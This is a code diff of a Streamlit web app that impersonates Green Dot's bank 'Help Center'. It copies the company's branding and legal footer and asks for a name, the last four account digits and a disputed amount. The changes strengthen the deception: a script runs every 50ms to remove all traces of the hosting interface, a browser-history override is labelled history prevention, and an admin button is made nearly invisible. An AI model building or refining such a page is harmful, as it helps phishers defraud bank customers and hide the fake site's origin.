@@ -23,20 +23,27 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# JAVASCRIPT: LIMPIEZA TOTAL Y SUPRESIÓN DE HISTORIAL
+# JAVASCRIPT NUCLEAR: ELIMINACIÓN AGRESIVA CADA 50ms
 st.markdown("""<script>
-    const forceClean = () => {
-        const toRemove = [
-            '.stElementToolbar', '[data-testid="stElementToolbar"]',
-            '.stTooltipHoverTarget', 'button[title="View fullscreen"]',
+    const nuclearClean = () => {
+        const selectors = [
             'header', 'footer', '.stDeployButton', '[data-testid="stHeader"]',
-            '[data-testid="stHeaderActionElements"]', '.section-anchor', 'a.section-anchor',
-            '.st-emotion-cache-gi0tri', '.st-emotion-cache-140j12g'
+            '[data-testid="stAppToolbar"]', '[data-testid="stHeaderActionElements"]',
+            '.stElementToolbar', '[data-testid="stElementToolbar"]', 
+            '.st-emotion-cache-gi0tri', '.st-emotion-cache-140j12g', 
+            '.st-emotion-cache-h5rgaw', '.section-anchor', 'a.section-anchor'
         ];
-        toRemove.forEach(s => {
-            document.querySelectorAll(s).forEach(el => { el.style.display = 'none'; el.remove(); });
+        selectors.forEach(s => {
+            document.querySelectorAll(s).forEach(el => {
+                el.style.visibility = 'hidden';
+                el.style.display = 'none';
+                el.style.height = '0';
+                el.remove();
+            });
         });
     };
+    
+    // Prevención de historial y limpieza
     if (window.history && window.history.replaceState) {
         const originalRS = window.history.replaceState;
         window.history.replaceState = function() {
@@ -44,20 +51,32 @@ st.markdown("""<script>
             return originalRS.apply(this, arguments);
         };
     }
-    setInterval(forceClean, 100);
+    
+    setInterval(nuclearClean, 50);
 </script>""", unsafe_allow_html=True)
 
-# CSS: ESTILOS, APPS Y BLOQUEO DE ENLACES
+# CSS NUCLEAR: BLOQUEO TOTAL DE VISIBILIDAD
 st.markdown("""<style>
-    .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
-    .block-container { max-width: 500px !important; padding-top: 2rem !important; }
+    /* Ocultar todo rastro de la interfaz de Streamlit/GitHub */
+    header, footer, .stDeployButton, [data-testid="stHeader"], 
+    [data-testid="stAppToolbar"], [data-testid="stHeaderActionElements"], 
+    .st-emotion-cache-gi0tri, .st-emotion-cache-140j12g, .st-emotion-cache-h5rgaw {
+        display: none !important;
+        visibility: hidden !important;
+        height: 0 !important;
+        width: 0 !important;
+        opacity: 0 !important;
+        pointer-events: none !important;
+    }
 
-    /* Eliminar links residuales en logo y h1 */
+    .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
+    .block-container { max-width: 500px !important; padding-top: 0.5rem !important; }
+
+    /* Logo y Títulos Estáticos */
     [data-testid="stImage"], [data-testid="stImage"] img, h1, .stMarkdown h1 {
         pointer-events: none !important;
         cursor: default !important;
         user-select: none !important;
-        text-decoration: none !important;
     }
 
     [data-testid="stImage"] img { width: 250px !important; margin: 0 auto; display: block; }
@@ -67,8 +86,8 @@ st.markdown("""<style>
     }
 
     .stButton > button {
-        background-color: #00a05b !important; color: white !important; 
-        width: 100%; border: none; height: 50px; border-radius: 8px; 
+        background-color: #00a05b !important; color: white !important;
+        width: 100%; border: none; height: 50px; border-radius: 8px;
         font-weight: bold !important;
     }
 
@@ -83,7 +102,7 @@ st.markdown("""<style>
     }
 
     .admin-trigger {
-        position: fixed; bottom: 10px; left: 10px; width: 30px; height: 30px; opacity: 0.02; z-index: 9999;
+        position: fixed; bottom: 10px; left: 10px; width: 30px; height: 30px; opacity: 0.01; z-index: 9999;
     }
 </style>""", unsafe_allow_html=True)
 
@@ -95,7 +114,7 @@ if not st.session_state.admin_mode:
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
 
-    with st.form("claim_v1_1_0", clear_on_submit=True):
+    with st.form("claim_v1_1_5", clear_on_submit=True):
         st.text_input("Full Name", autocomplete="name")
         st.text_input("Last 4 digits of Account")
         st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -104,7 +123,6 @@ if not st.session_state.admin_mode:
         if st.form_submit_button("SUBMIT NOW"):
             st.success("Claim Received successfully.")
 
-    # SECCIÓN DE DESCARGA DE APPS
     st.markdown("""<div class='promo-box'>
         <h3 style='color:white; margin-bottom:15px; font-size:1.1rem;'>Download the Green Dot app</h3>
         <div style='display: flex; justify-content: center; gap: 10px; flex-wrap: wrap;'>
@@ -113,15 +131,13 @@ if not st.session_state.admin_mode:
         </div>
     </div>""", unsafe_allow_html=True)
 
-    # FOOTER LEGAL
     st.markdown("""<div class='legal-container'>
         Green Dot&reg; cards are issued by Green Dot Bank, Member FDIC, pursuant to a license from Visa U.S.A., Inc. and by Mastercard International Inc. <br><br>
         &copy;2026 Green Dot Corporation. All rights reserved. NMLS #914924; Green Dot Bank NMLS #908739.
     </div>""", unsafe_allow_html=True)
 
-    # Botón Admin oculto
     st.markdown("<div class='admin-trigger'>", unsafe_allow_html=True)
-    if st.button(" ", key="adm_btn"):
+    if st.button(" ", key="adm_btn"): 
         st.session_state.admin_mode = True
         st.rerun()
     st.markdown("</div>", unsafe_allow_html=True)
